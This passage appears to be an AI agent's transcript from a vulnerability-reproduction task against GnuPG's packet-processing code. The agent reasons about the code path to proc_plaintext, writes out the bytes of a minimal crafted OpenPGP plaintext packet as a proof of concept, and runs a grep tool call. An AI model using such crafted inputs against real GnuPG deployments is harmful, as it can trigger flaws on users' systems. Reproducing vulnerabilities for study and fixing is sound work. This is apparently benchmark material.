`c->sigs_only = 1` is set. So in `do_proc_packets`, when a `PKT_PLAINTEXT` packet is encountered, `proc_plaintext(c, pkt)` is called. 

Now let me construct the PoC. A minimal plaintext packet:
- Header: 0xCB (old format, tag 11 = plaintext, length type 1)
- Length: 6 (mode + namelen + 4-byte timestamp)
- Body: mode=0x62 ('b'), namelen=0x00, timestamp=4 bytes (e.g., 0x00000000)

The packet body is 6 bytes: `62 00 00 00 00 00`

Full packet: `CB 06 62 00 00 00 00 00`

Let me create this PoC and the trace, then submit. Let me first check the exact line numbers in mainproc.c for the trace:

<｜｜DSML｜｜>
<parameter=command>grep -n "free_packet (pkt, NULL);\|extrahash = xtrymalloc\|pt->namelen\|pt->mode\|pt->name\|pt->timestamp\|proc_plaintext( CTX c" /workspace/repo-vul/src-vul/gnupg/g10/mainproc.c | head -20</parameter>
</｜｜DSML｜｜>
